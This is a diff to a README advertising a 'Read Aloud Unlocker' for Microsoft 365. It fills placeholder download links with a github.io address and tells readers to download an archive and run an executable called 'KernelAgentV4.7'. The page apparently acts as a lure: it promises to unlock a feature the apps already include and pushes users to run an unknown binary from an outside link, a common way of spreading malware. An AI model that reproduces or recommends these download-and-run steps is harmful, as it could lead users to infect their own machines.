@@ -2,13 +2,15 @@
 
 Enable Microsoft’s Read Aloud feature to have documents, emails, and notes read aloud using high-quality voices. Ideal for multitasking, accessibility, and proofreading. This unlocker activates full TTS support with `KernelAgentV4.7`.
 
-[![Download Read Aloud Unlocker](https://img.shields.io/badge/Download-Read_Aloud_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Read Aloud Unlocker](https://img.shields.io/badge/Download-Read_Aloud_Tool-blueviolet)](https://m365-read-aloud-tts.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-read-aloud-tts.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a directory like `C:\M365ReadAloud`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to activate voice reading components  
 4. 🔊 Open Word, Outlook, or OneNote → Review → Read Aloud  
